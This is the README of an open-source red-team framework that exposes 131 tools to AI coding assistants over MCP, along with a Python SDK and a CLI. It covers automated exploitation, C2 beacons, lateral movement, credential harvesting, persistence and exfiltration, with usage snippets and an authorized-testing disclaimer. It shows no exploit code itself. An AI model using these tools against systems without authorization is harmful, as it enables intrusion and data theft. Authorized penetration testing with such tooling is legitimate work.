<h1 align="center">AutoRedTeam-Orchestrator</h1>

<p align="center">
  <b>Enterprise AI Red Team Orchestration Platform</b><br>
  <sub>Pure Python Engines | MCP + SDK + CLI | Full Kill Chain Automation | Auto-download Tools</sub>
</p>

<p align="center">
  <a href="README.md">简体中文</a> ·
  <a href="README_EN.md"><b>English</b></a>
</p>

<p align="center">
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/stargazers"><img src="https://img.shields.io/github/stars/Coff0xc/AutoRedTeam-Orchestrator?style=flat-square&logo=github&color=gold" alt="Stars"></a>
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/network/members"><img src="https://img.shields.io/github/forks/Coff0xc/AutoRedTeam-Orchestrator?style=flat-square&logo=github&color=silver" alt="Forks"></a>
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/issues"><img src="https://img.shields.io/github/issues/Coff0xc/AutoRedTeam-Orchestrator?style=flat-square&logo=github&color=red" alt="Issues"></a>
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/commits/main"><img src="https://img.shields.io/github/last-commit/Coff0xc/AutoRedTeam-Orchestrator?style=flat-square&logo=github" alt="Last Commit"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-3.1.0-blue?style=flat-square" alt="Version">
  <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/MCP-Native-00ADD8?style=flat-square" alt="MCP">
  <img src="https://img.shields.io/badge/Tools-132-FF6B6B?style=flat-square" alt="Tools">
  <img src="https://img.shields.io/badge/Tests-1980-4CAF50?style=flat-square" alt="Tests">
  <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" alt="License">
</p>

<p align="center">
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/actions"><img src="https://img.shields.io/github/actions/workflow/status/Coff0xc/AutoRedTeam-Orchestrator/ci.yml?style=flat-square&logo=github-actions&logoColor=white&label=CI" alt="CI"></a>
  <a href="https://discord.gg/PtVyrMvB"><img src="https://img.shields.io/badge/Discord-Community-5865F2?style=flat-square&logo=discord&logoColor=white" alt="Discord"></a>
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/wiki"><img src="https://img.shields.io/badge/Wiki-Docs-blue?style=flat-square&logo=gitbook&logoColor=white" alt="Wiki"></a>
</p>

---

```
+-----------------------------------------------------------------------------+
|                    AutoRedTeam-Orchestrator v3.1.0                           |
+-----------------------------------------------------------------------------+
|  * 132 MCP Tools         * 14 YAML Payload Files  * 1980 Tests             |
|  * 10-Phase Recon        * 26 Vuln Detectors      * 5-Protocol Lateral     |
|  * MCTS Attack Planner   * SQLite Knowledge Graph  * Production C2 Server  |
|  * Nuclei Template Engine * Docker Sandbox         * SARIF CI/CD Output    |
|  * Unified Engine Router  * Auto-Download Tools   * LaZagne Integration    |
|  * PostExploit Executor   * Passive Recon (6 src) * LLM-Enhanced Decision  |
+-----------------------------------------------------------------------------+
|  Three Interfaces: MCP Server | Python SDK | CLI                            |
|  AI Editors: Cursor | Windsurf | Kiro | Claude Desktop | Claude Code       |
+-----------------------------------------------------------------------------+
```

---

## Table of Contents

- [Quick Start](#quick-start)
- [Architecture](#architecture)
- [Tool Matrix](#tool-matrix-131-mcp-tools)
- [Key Features](#key-features)
  - [Pure Python Security Engines](#pure-python-security-engines)
  - [Full Red Team Kill Chain](#full-red-team-kill-chain)
  - [MCTS Attack Path Planner](#mcts-attack-path-planner)
  - [Knowledge Graph](#knowledge-graph)
  - [Nuclei Template Engine](#nuclei-template-engine)
  - [Docker Sandbox Executor](#docker-sandbox-executor)
  - [Unified LLM Provider](#unified-llm-provider)
  - [False-Positive Filter](#false-positive-filter)
- [MCP Configuration](#mcp-configuration)
- [Python SDK Usage](#python-sdk-usage)
- [CLI Usage](#cli-usage)
- [CI/CD Integration](#cicd-integration)
- [Configuration](#configuration)
- [Development](#development)
- [Roadmap](#roadmap)
- [Contributing](#contributing)
- [License](#license)
- [Disclaimer](#disclaimer)

---

## Quick Start

### Requirements

- Python 3.10+
- Windows / Linux / macOS

### Installation

```bash
# Clone
git clone https://github.com/Coff0xc/AutoRedTeam-Orchestrator.git
cd AutoRedTeam-Orchestrator

# Core dependencies (zero external security tools required)
pip install -r requirements-core.txt

# Full dependencies (optional LLM, Docker sandbox, etc.)
pip install -r requirements.txt

# Development (testing, linting)
pip install -r requirements-dev.txt
```

### Usage Mode 1 -- MCP Server (AI Editor Integration)

```bash
python mcp_stdio_server.py
```

Then configure your AI editor to connect via MCP (see [MCP Configuration](#mcp-configuration)).

### Usage Mode 2 -- Python SDK

```python
from autort import Scanner, Exploiter, AutoPentest

# Recon
scanner = Scanner("http://target.com")
results = await scanner.full_recon()

# Detect vulnerabilities
vulns = await scanner.detect_vulns(categories=["sqli", "xss"])

# One-click pentest
pentest = AutoPentest("http://target.com")
report = await pentest.run()
```

### Usage Mode 3 -- CLI

```bash
# Port scan
autort scan http://target.com --ports 1-1000

# Full 10-phase recon
autort scan http://target.com --full

# Vulnerability detection
autort detect http://target.com -c sqli,xss,ssrf

# CVE exploit
autort exploit http://target.com --cve CVE-2021-44228

# Full automated pentest
autort pentest http://target.com

# Generate report
autort report <session_id> -f html
```

---

## Architecture

```
AI Editor (Cursor / Windsurf / Kiro / Claude Desktop / Claude Code)
        |  MCP Protocol (JSON-RPC over stdio)
        v
mcp_stdio_server.py ---- FastMCP("AutoRedTeam")  [131 tools registered]
        |
   handlers/  (21 handler modules)
        |
        +-------------------+-------------------+
        |                   |                   |
     core/              autort/              cli/
   (engines)             (SDK)              (CLI)
        |
        +-- detectors/           26 vulnerability detectors
        +-- exploit/             exploit engine + orchestrator
        +-- recon/               10-phase reconnaissance pipeline
        +-- lateral/             SMB / SSH / WMI / WinRM / PSExec
        +-- c2/                  beacon + DNS/HTTP/WS/ICMP tunnels
        +-- orchestrator/        auto-pentest orchestration
        +-- evasion/             XOR / AES / Base64 / custom encoders
        +-- stealth/             stealth operations
        +-- exfiltration/        data exfiltration
        +-- persistence/         Windows / Linux persistence
        +-- privilege_escalation/ privesc engines
        +-- credential/          credential discovery
        +-- post_exploit/        post-exploitation
        +-- ad/                  Active Directory attacks
        +-- knowledge/           SQLite-backed knowledge graph (17 entity types)
        +-- cve/                 CVE intelligence + AI PoC generation
        +-- payload/             payload management
        +-- api_security/        JWT / CORS / GraphQL / WebSocket
        +-- cloud_security/      K8s / gRPC / AWS
        +-- supply_chain/        SBOM / dependency audit
        +-- config/              Pydantic unified config system
        +-- llm/                 unified LLM provider (LiteLLM)
        +-- sandbox/             Docker sandbox executor
        +-- reporting/           JSON / HTML / Markdown / SARIF 2.1.0
```

### Design Patterns

| Pattern | Location | Description |
|---------|----------|-------------|
| Handler Registration | `handlers/__init__.py` | 21 modules registered via `register_all_handlers()`, per-module error isolation |
| Unified Result | `core/result.py` | All tools return `ToolResult` with `ResultStatus.SUCCESS/FAILURE/ERROR` |
| Detector ABC | `core/detectors/base.py` | `BaseDetector` defines `detect()` / `async_detect()`, composite pattern for multi-vuln |
| Dependency Injection | `core/container.py` | Thread-safe DI container (Singleton / Scoped / Transient lifetimes) |
| MCTS Planner | `core/mcts_planner.py` | UCB1-based attack path optimization over `AttackState` space |
| Knowledge Graph | `core/knowledge/manager.py` | Entity-relationship store with BFS path discovery and similarity matching |
| Decorator Stack | `handlers/tooling.py` + `handlers/error_handling.py` | `@tool(mcp)` + `@validate_inputs` + `@handle_errors` layered decorators |
| Exception Hierarchy | `core/exceptions/` | `AutoRedTeamError` base with 30+ domain-specific subclasses, all serializable |
| Auth Middleware | `core/security/mcp_auth_middleware.py` | `AuthMode.STRICT` (default) / `PERMISSIVE` / `DISABLED` |

---

## Tool Matrix (131 MCP Tools)

| Category | Count | Handler File | Key Tools |
|----------|------:|--------------|-----------|
| Reconnaissance | 8 | `recon_handlers.py` | `port_scan`, `subdomain_enum`, `fingerprint`, `waf_detect` |
| Vulnerability Detection | 26 | `detector_factory.py` | `sqli_scan`, `xss_scan`, `ssrf_scan`, `rce_scan`, `xxe_scan`, `ssti_scan` |
| API Security | 7 | `api_security_handlers.py` | `jwt_scan`, `graphql_scan`, `websocket_scan`, `cors_scan` |
| Supply Chain | 3 | `supply_chain_handlers.py` | `sbom_generate`, `dependency_audit`, `cicd_scan` |
| Cloud Native | 3 | `cloud_security_handlers.py` | `k8s_scan`, `grpc_scan`, `aws_scan` |
| Red Team | 14 | `redteam_handlers.py` | `lateral_smb`, `c2_beacon_start`, `credential_find` |
| Lateral Movement | 9 | `lateral_handlers.py` | `lateral_ssh`, `lateral_wmi`, `lateral_winrm`, `lateral_psexec` |
| Persistence | 3 | `persistence_handlers.py` | `persistence_windows`, `persistence_linux` |
| AD Attack | 3 | `ad_handlers.py` | `ad_enumerate`, `ad_kerberos_attack` |
| CVE Intelligence | 8 | `cve_handlers.py` | `cve_search`, `cve_auto_exploit`, `cve_generate_poc` |
| Orchestration | 11 | `orchestration_handlers.py` | `auto_pentest`, `attack_chain_plan`, `smart_analyze` |
| External Tools | 8 | `external_tools_handlers.py` | `ext_nmap_scan`, `ext_nuclei_scan`, `ext_sqlmap_scan` |
| AI | 3 | `ai_handlers.py` | `smart_payload`, `ai_attack_chain` |
| Session | 4 | `session_handlers.py` | `session_create`, `session_status` |
| Report | 2 | `report_handlers.py` | `generate_report`, `export_findings` |
| Parallel Scan | 1 | `parallel_handlers.py` | `parallel_scan` |
| Knowledge Graph | 3 | `knowledge_handlers.py` | `knowledge_query`, `knowledge_add` |
| MCTS Planner | 1 | `mcts_handlers.py` | `mcts_plan` |
| MCP Prompts | 6 | `prompt_handlers.py` | Prompt templates for AI editors |
| MCP Resources | 4 | `resource_handlers.py` | Resource endpoints |
| Misc | 3 | `misc_handlers.py` | Utility tools |

---

## Key Features

### Pure Python Security Engines

All 26 vulnerability detectors are implemented in pure Python with zero dependency on external security tools. Each detector inherits from `BaseDetector` and implements `detect()` / `async_detect()`.

**Detector categories (26 total):**

| Category | Detectors |
|----------|-----------|
| Injection | SQLi, XSS, RCE, SSTI, XXE, LDAP, CRLF Injection, Deserialization, Prototype Pollution |
| Access | SSRF, IDOR, Open Redirect, Path Traversal |
| Auth | Auth Bypass, JWT Flaws, Session Issues, Weak Password |
| File | LFI, File Upload |
| Request | HTTP Smuggling, Cache Poisoning, Host Header Injection |
| Misc | CORS, CSRF, Security Headers, Information Disclosure |

### Full Red Team Kill Chain

Complete attack lifecycle support:

```
Recon --> Detect --> Exploit --> Lateral --> C2 --> Persist --> PrivEsc --> Exfil --> Report
```

| Phase | Capabilities |
|-------|-------------|
| Recon | 10-phase pipeline: DNS, ports, fingerprint, tech stack, WAF, subdomains, directories, JS analysis, sensitive info, OSINT |
| Detect | 26 detectors with multi-method verification |
| Exploit | CVE auto-exploit, AI PoC generation, feedback-loop retry |
| Lateral | SMB, SSH, WMI, WinRM, PSExec (5 protocols) |
| C2 | Beacon management + DNS / HTTP / WebSocket / ICMP tunnels |
| Persist | Windows (registry, scheduled tasks, WMI) / Linux (cron, webshell) |
| PrivEsc | Windows and Linux privilege escalation engines |
| Exfil | Data exfiltration with stealth options |
| Report | JSON / HTML / Markdown / SARIF 2.1.0 |

### MCTS Attack Path Planner

Monte Carlo Tree Search (UCB1) for optimal attack path planning. The planner models the target as an `AttackState` (target + open ports + access level) and generates/simulates candidate actions to find the highest-success-probability attack chain.

```python
from core.mcts_planner import MCTSPlanner, AttackState

state = AttackState(target="192.168.1.100", ports=[22, 80, 443], access_level="none")
planner = MCTSPlanner(iterations=1000)
best_path = planner.plan(state)
```

### Knowledge Graph

SQLite-backed knowledge graph with 17 entity types (Target, Service, Vulnerability, Credential, Exploit, etc.) and relationship tracking. Supports BFS path discovery, similarity matching, and cross-session knowledge persistence.

```python
from core.knowledge.manager import KnowledgeManager

km = KnowledgeManager()
km.add_entity("target", {"ip": "192.168.1.100", "hostname": "web01"})
km.add_relationship("target:192.168.1.100", "has_vuln", "vuln:CVE-2021-44228")
paths = km.find_paths("target:192.168.1.100", "credential:admin")
```

### Nuclei Template Engine

Pure Python Nuclei template engine that can parse and execute 185,000+ community templates without requiring the Nuclei binary. Supports HTTP, DNS, and network protocol templates.

### Docker Sandbox Executor

Optional Docker-based sandbox for isolating exploit execution. Graceful fallback to local execution when Docker is unavailable.

Configuration in `core/sandbox/config.py`:
- Container image, resource limits, network policy
- Auto-cleanup after execution
- Result extraction from sandbox

### Unified LLM Provider

Optional LLM integration via LiteLLM for AI-powered features (PoC generation, smart payload selection, attack chain reasoning). Supports:

| Provider | Models |
|----------|--------|
| OpenAI | GPT-4, GPT-4o |
| Anthropic | Claude 3.5 Sonnet, Claude 3 Opus |
| Ollama | Any local model |
| DeepSeek | DeepSeek-V2 |

### False-Positive Filter

Multi-method verification to minimize false positives:

- **Statistical verification** -- response difference significance testing
- **Boolean verification** -- true/false response comparison
- **Time-based verification** -- delay detection for blind injections
- **OOB verification** -- DNS/HTTP callback for out-of-band confirmation
- **WAF/SPA/Rate-limit/CAPTCHA detection** -- environmental false-positive filtering

---

## MCP Configuration

### Cursor / Windsurf / Kiro

Add to your MCP configuration file (e.g., `~/.cursor/mcp.json`):

```json
{
  "mcpServers": {
    "redteam": {
      "command": "python",
      "args": ["/absolute/path/to/mcp_stdio_server.py"],
      "env": {
        "PYTHONIOENCODING": "utf-8"
      }
    }
  }
}
```

### Claude Desktop

Add to `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "redteam": {
      "command": "python",
      "args": ["/absolute/path/to/mcp_stdio_server.py"],
      "env": {
        "PYTHONIOENCODING": "utf-8"
      }
    }
  }
}
```

### Claude Code

```bash
claude mcp add redteam python /absolute/path/to/mcp_stdio_server.py
```

Once connected, all 131 tools are available to the AI editor. Simply describe your security testing task in natural language.

---

## Python SDK Usage

The `autort/` package exposes five main classes:

```python
from autort import Scanner, Exploiter, AutoPentest, RedTeam, Reporter
```

### Scanning and Reconnaissance

```python
scanner = Scanner("http://target.com")

# Full 10-phase recon
recon = await scanner.full_recon()

# Port scan only
ports = await scanner.port_scan("1-1000")
ports = await scanner.port_scan(top=100)  # Top 100 common ports

# Vulnerability detection
vulns = await scanner.detect_vulns(categories=["sqli", "xss", "ssrf"])
```

### Exploitation

```python
exploiter = Exploiter("http://target.com")

# CVE-based exploit
result = await exploiter.cve_exploit("CVE-2021-44228")

# Auto-exploit top N vulnerabilities
results = await exploiter.auto_exploit(top_n=5)

# CVE search
cves = await exploiter.cve_search("Apache Log4j", severity="critical", has_poc=True)
```

### Automated Pentest

```python
pentest = AutoPentest("http://target.com")

# Full pipeline: RECON -> VULN_SCAN -> POC_EXEC -> EXPLOIT -> PRIV_ESC -> LATERAL -> EXFIL -> REPORT
result = await pentest.run()

# Resume from a previous session
result = await pentest.resume("session_id_here")
```

### Red Team Operations

```python
redteam = RedTeam()

# Lateral movement
result = await redteam.lateral_move("192.168.1.100", method="ssh", username="admin", password="pass")

# C2 beacon
result = await redteam.c2_start("c2.example.com", port=443, protocol="https")
```

### Reporting

```python
reporter = Reporter(session_id="...")

# Generate report
report = await reporter.generate(format="html")  # html / json / markdown / sarif
```

---

## CLI Usage

The CLI is built with [Typer](https://typer.tiangolo.com/) and wraps the `autort` SDK.

```bash
# Scan
autort scan <target> [--full] [--ports 1-1000] [--top 100] [--quick] [-o output.json]

# Detect vulnerabilities
autort detect <target> [-c sqli,xss,ssrf] [--format json|sarif] [--ci] [--severity-threshold high]

# Exploit
autort exploit <target> [--cve CVE-2021-44228] [--auto] [--top-n 5] [-o output.json]

# CVE search
autort cve-search <keyword> [--severity critical] [--has-poc] [--limit 20]

# Automated pentest
autort pentest <target> [--phases recon,vuln_scan,exploit] [--resume <session_id>] [--timeout 3600]

# Report
autort report <session_id> [-f html|json|markdown|sarif] [-o report.html]

# List all tools
autort tools
```

### CI Mode

The `detect` command supports a CI mode that outputs a concise summary and returns a non-zero exit code when vulnerabilities meeting the severity threshold are found:

```bash
autort detect http://target.com --ci --severity-threshold high --format sarif -o results.sarif
```

---

## CI/CD Integration

### GitHub Action

AutoRedTeam ships as a reusable GitHub Action (`action.yml`). Add to your workflow:

```yaml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: AutoRedTeam Security Scan
        uses: Coff0xc/AutoRedTeam-Orchestrator@main
        with:
          target: 'http://localhost:8080'
          scan-type: 'detect'
          categories: 'sqli,xss,ssrf'
          severity-threshold: 'high'
          output-format: 'sarif'

      # SARIF results automatically uploaded to GitHub Security tab
```

**Action inputs:**

| Input | Required | Default | Description |
|-------|:--------:|---------|-------------|
| `target` | Yes | -- | Target URL to scan |
| `scan-type` | No | `detect` | `detect` / `recon` / `full` |
| `categories` | No | (all) | Detection categories, comma-separated |
| `severity-threshold` | No | `high` | Minimum severity to fail: `info` / `low` / `medium` / `high` / `critical` |
| `output-format` | No | `sarif` | `json` / `sarif` |

SARIF 2.1.0 output integrates directly with GitHub Code Scanning alerts.

---

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `OPENAI_API_KEY` | OpenAI API key (for AI features) | -- |
| `ANTHROPIC_API_KEY` | Anthropic API key (for AI features) | -- |
| `SHODAN_API_KEY` | Shodan API key (for OSINT recon) | -- |
| `CENSYS_API_ID` | Censys API ID | -- |
| `CENSYS_API_SECRET` | Censys API secret | -- |
| `ART_AUTH_MODE` | Auth mode: `strict` / `permissive` / `disabled` | `strict` |
| `ART_LOG_LEVEL` | Log level: `DEBUG` / `INFO` / `WARNING` / `ERROR` | `INFO` |
| `ART_MAX_CONCURRENT` | Maximum concurrent tool executions | `5` |
| `ART_DEFAULT_TIMEOUT` | Default tool timeout in seconds | `300` |
| `SKIP_NETWORK_TESTS` | Skip network-dependent tests | `false` |

### Configuration Files

| File | Purpose |
|------|---------|
| `config/config.yaml` | Main server configuration (copy from `config.yaml.example`) |
| `config/external_tools.yaml` | External tool paths and chain configs (copy from `external_tools.yaml.example`) |

### External Tools (Optional)

External tools are optional. The framework works fully with pure Python engines. When available, external tools provide additional capabilities:

Configure in `config/external_tools.yaml`:

| Tool | Purpose |
|------|---------|
| nmap | Advanced port scanning / OS detection |
| nuclei | Template-based vulnerability scanning |
| sqlmap | SQL injection exploitation |
| ffuf | Web fuzzing |
| masscan | High-speed port scanning |

Tool chains allow sequencing (e.g., masscan -> nmap for fast discovery + deep scan).

---

## Development

### Running Tests

```bash
# All tests (1963 total)
pytest

# By marker
pytest -m "unit"           # Unit tests only
pytest -m "security"       # Security tests only
pytest -m "not slow"       # Skip slow tests
pytest -m "not network"    # Skip network-dependent tests

# Specific file or class
pytest tests/test_mcp_security.py
pytest tests/test_mcp_security.py::TestInputValidator -v

# With coverage
pytest --cov=core --cov=handlers --cov-report=html
```

Auth is auto-disabled for all tests via the `disable_auth_for_tests` fixture in `conftest.py`.

Async tests use `asyncio_mode = "auto"` -- no need for `@pytest.mark.asyncio` on individual tests.

### Code Quality

```bash
# Format
black core/ modules/ handlers/ utils/ mcp_stdio_server.py
isort core/ modules/ handlers/ utils/ mcp_stdio_server.py

# Lint
pylint core/ modules/ handlers/ utils/
flake8 --max-line-length 100 --ignore=E501,W503,E402,E203,W504 core/ modules/ utils/ handlers/

# Type check
mypy core/ modules/ handlers/ utils/

# Security scan
bandit -c .bandit -r core/ modules/ utils/ handlers/
```

### Coding Conventions

- **Formatter**: Black (line length 100)
- **Import sorting**: isort with Black profile
- **Logging**: Lazy format (`%s`) -- never use f-strings in log calls
- **Paths**: `pathlib.Path` for cross-platform compatibility
- **File encoding**: Always specify `encoding='utf-8'`
- **External tools**: Check with `shutil.which()` before calling
- **Async**: `async`/`await` for all I/O-bound operations
- **Naming**: `snake_case` for functions/variables, `PascalCase` for classes
- **Docstrings**: Google style for public APIs
- **Commits**: [Conventional Commits](https://www.conventionalcommits.org/) (`feat:`, `fix:`, `docs:`, `refactor:`, `test:`, `chore:`, `security:`, `perf:`)

---

## Roadmap

- [ ] Web dashboard UI
- [ ] Multi-target campaign management
- [ ] Plugin marketplace for community detectors
- [ ] Native Nuclei binary integration (alongside pure Python engine)
- [ ] Real-time collaboration for team operations
- [ ] Expanded cloud provider support (Azure, GCP)
- [ ] MITRE ATT&CK Navigator auto-export
- [ ] Automated remediation suggestions with LLM

---

## Contributing

Contributions are welcome. Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

1. Fork the repository
2. Create a feature branch (`git checkout -b feat/my-feature`)
3. Follow the coding conventions above
4. Add tests for new functionality
5. Run `pytest` and `black`/`isort` before committing
6. Submit a pull request

---

## License

This project is licensed under the [MIT License](LICENSE).

## Disclaimer

**AutoRedTeam-Orchestrator is designed for authorized security testing and educational purposes only.**

- Only use this tool against systems you have explicit written permission to test.
- The authors are not responsible for any misuse or damage caused by this tool.
- Unauthorized access to computer systems is illegal in most jurisdictions.
- Always obtain proper authorization before conducting any security testing.
- This tool is provided "as-is" without warranty of any kind.

---

<p align="center">
  Built by <a href="https://github.com/Coff0xc">Coff0xc</a>
</p>
